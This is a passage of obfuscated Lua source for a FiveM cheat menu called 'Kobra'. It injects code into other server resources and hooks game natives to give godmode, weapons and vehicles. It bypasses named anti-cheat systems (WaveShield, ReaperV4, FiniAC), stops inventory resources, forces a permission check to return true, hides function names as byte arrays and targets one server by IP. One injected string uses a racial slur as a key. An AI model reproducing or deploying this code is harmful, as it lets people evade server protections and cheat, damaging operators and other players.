    ]],v226));end;v12.HandleGodmodeToggle=function(v227,v228) local v229=GetResourceState("WaveShield")=="started" ;local v230=((GetResourceState("monitor")=="started") and "monitor") or (v229 and "WaveShield") or "any" ;if v229 then local v529=0 -0 ;while true do if (v529==0) then if v228 then local v938=0 -0 ;while true do if (v938==(0 + 0)) then v12:Notify("success","Kobra","Godmode Enabled (WaveShield)",5905 -2905 );v48(v230,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end else local v939=0;while true do if (v939==(0 + 0)) then v12:Notify("error","Kobra","Godmode Disabled (WaveShield)",8826 -5826 );v48(v230,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end end return;end end end if v228 then v12:Notify("success","Kobra","Godmode Enabled",3017 -(12 + 5) );MachoInjectResource2(11 -8 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]]);else local v530=0;while true do if (v530==(0 -0)) then v12:Notify("error","Kobra","Godmode Disabled",6377 -3377 );MachoInjectResource2(7 -4 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]]);break;end end end end;v12.SpawnSelectedVehicle=function(v231,v232,v233,v234) local v235=0 + 0 ;local v236;local v237;local v238;local v239;local v240;while true do if ((1974 -(1656 + 317))==v235) then v237=GetVehiclePedIsIn(v236,false);v238=GetCurrentServerEndpoint();v235=2 + 0 ;end if ((0 + 0)==v235) then if ( not v232 or (v232=="")) then return;end v236=PlayerPedId();v235=2 -1 ;end if (3==v235) then if (GetResourceState("solos-rentals")=="started") then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 1)",14764 -11764 );print("Creating Vehicle via Fallback #1");v48("solos-rentals",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]],v232,tostring(v234),tostring(v233),v239.x,v239.y,v239.z,v240));elseif (GetResourceState("amigo")=="started") then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 2)",3000);print("Creating Vehicle via Fallback #2");v48("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v232,tostring(v234),tostring(v233)));elseif v76 then local v1075=0;while true do if (v1075==(354 -(5 + 349))) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 3)",3000);print("Creating Vehicle via Fallback #3");v1075=4 -3 ;end if (v1075==1) then v48(v76,string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]],v232,tostring(v234),tostring(v233)));break;end end elseif (GetResourceState("qb-core")=="started") then local v1182=1271 -(266 + 1005) ;while true do if (v1182==(1 + 0)) then v48("qb-core",[[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]]   .. v232   .. [["

            if ]]   .. tostring(v234)   .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]]   .. tostring(v233)   .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]]   .. v239.x   .. [[, ]]   .. v239.y   .. [[, ]]   .. v239.z   .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]]   .. v240   .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]] );break;end if (v1182==(0 -0)) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 4)",3000);print("Creating Vehicle via Fallback #4");v1182=1;end end elseif ((v238:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 5)",3949 -949 );print("Creating Vehicle via Fallback #5");v48("drc_gardener",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]],v232,tostring(v234),tostring(v233)));elseif (GetResourceState("lunar_bridge")=="started") then local v1365=1696 -(561 + 1135) ;while true do if (v1365==(0 -0)) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 6)",9861 -6861 );print("Creating Vehicle via Fallback #6");v1365=1;end if (v1365==1) then v48("lunar_bridge",string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]],v232,tostring(v234),tostring(v233)));break;end end elseif (GetResourceState("lation_laundering")=="started") then local v1451=1066 -(507 + 559) ;while true do if (v1451==(2 -1)) then v48("lation_laundering",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]],v232,tostring(v233),tostring(v234)));break;end if (v1451==0) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 7)",9278 -6278 );print("Creating Vehicle via Fallback #7");v1451=389 -(212 + 176) ;end end else local v1452=0;local v1453;while true do if (v1452==(905 -(250 + 655))) then v1453=v75();if v1453 then local v1623=0 -0 ;while true do if (v1623==(1 -0)) then v48(v1453,string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]],v232,tostring(v234),tostring(v233)));break;end if (v1623==(0 -0)) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 8)",4956 -(1869 + 87) );print("Creating Vehicle via Fallback #8");v1623=3 -2 ;end end elseif ((GetResourceState("monitor")=="started") or (GetResourceState("ox_lib")=="started")) then local v1638=1901 -(484 + 1417) ;local v1639;local v1640;local v1641;local v1642;local v1643;local v1644;local v1645;while true do if (v1638==(4 -2)) then v1644,v1645=pcall(MachoInjectResourceRaw,"monitor",v1643);if  not v1644 then end return;end if (v1638==1) then v1640=v1639(v232);v1641=tostring(v234);v1642=tostring(v233);v1643=string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]],v1640,v1641,v1642);v1638=2 -0 ;end if (v1638==(773 -(48 + 725))) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 9)",4900 -1900 );if ( not v232 or (v232=="")) then return;end v1639=nil;function v1639(v1657) local v1658={};for v1660=2 -1 , #v1657 do v1658[v1660]=string.byte(v1657,v1660);end return "{"   .. table.concat(v1658,",")   .. "}" ;end v1638=1 + 0 ;end end end v1452=1;end if ((2 -1)==v1452) then if (GetResourceState("lb-phone")=="started") then local v1624=0;local v1625;local v1626;while true do if (1==v1624) then v1625,v1626=pcall(function() v48("lb-phone",([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(v234),v232,tostring(v233),v239.x,v239.y,v239.z,v240));end);if  not v1625 then end break;end if (v1624==(0 + 0)) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 10)",3000);print("Creating Vehicle via Fallback #10");v1624=1 + 0 ;end end elseif (GetResourceState("qb-core")=="started") then local v1646=853 -(152 + 701) ;while true do if (v1646==0) then v231:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 11)",4311 -(430 + 881) );print("Creating Vehicle via Fallback #11");v1646=1;end if (v1646==(1 + 0)) then v48("lb-phone",string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]],tostring(v234),GetHashKey(v232),tostring(v233)));break;end end else return;end break;end end end break;end if (v235==(897 -(557 + 338))) then v239=GetEntityCoords(v236);v240=GetEntityHeading(v236);v235=1 + 2 ;end end end;local function v82() local v241=0 -0 ;local v242;while true do if (v241==(0 -0)) then v242={"WaveShield","FiniAC"};for v697,v698 in ipairs(v242) do if (GetResourceState(v698)=="started") then return false;end end v241=1;end if (v241==(802 -(499 + 302))) then return GetResourceState("ReaperV4")=="started" ;end end end local function v83() local v243={"ReaperV4","WaveShield"};for v336,v337 in ipairs(v243) do if (GetResourceState(v337)=="started") then return false;end end return GetResourceState("FiniAC")=="started" ;end v12.SpawnSelectedWeapon=function(v244,v245) local v246=0;local v247;local v248;local v249;local v250;local v251;while true do if (1==v246) then function v247(v699) local v700=0 -0 ;local v701;while true do if ((3 -2)==v700) then return table.concat(v701,",");end if ((0 -0)==v700) then v701={};for v979=1 + 0 , #v699 do v701[v979]=string.byte(v699,v979);end v700=2 -1 ;end end end v248=v247(v245);v246=1 + 1 ;end if (v246==2) then v249=PlayerPedId();if ( not v249 or (v249<=(0 -0))) then return;end v246=3;end if (v246==(107 -(103 + 1))) then v250=GetHashKey(v245);if (v250==(554 -(475 + 79))) then return;end v246=8 -4 ;end if ((12 -8)==v246) then v251=GetResourceState("WaveShield")=="started" ;if v251 then local v781=0 + 0 ;while true do if ((0 + 0)==v781) then v244:Notify("success","Kobra","Spawned Weapon via WaveShield Bypass V2",4503 -(1395 + 108) );v48(((GetResourceState("ox_lib")=="started") and "ox_lib") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]],v249,v248));break;end end elseif (GetResourceState("ReaperV4")=="started") then local v940=0;while true do if (v940==(8 -5)) then MachoInjectResource("ReaperV4",[[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]]   .. v250   .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]] );break;end if ((1206 -(7 + 1197))==v940) then SetCurrentPedWeapon(v249,v250,true);Wait(110 + 140 );v940=2 + 1 ;end if (v940==(320 -(27 + 292))) then v244:Notify("success","Kobra","Spawned Weapon via ReaperV4 fallback",8791 -5791 );GiveWeaponToPed(v249,v250,9999,false,true);v940=2 -0 ;end if (v940==(0 -0)) then MachoResourceStop("ox_inventory");MachoResourceStop("ox_lib");v940=1;end end elseif (GetResourceState("FiniAC")=="started") then v244:Notify("info","Kobra","Spawned Weapon Bypass #1",3000);MachoResourceStop("ox_inventory");v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]],v248));else local v1076=0 -0 ;while true do if (1==v1076) then v48(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
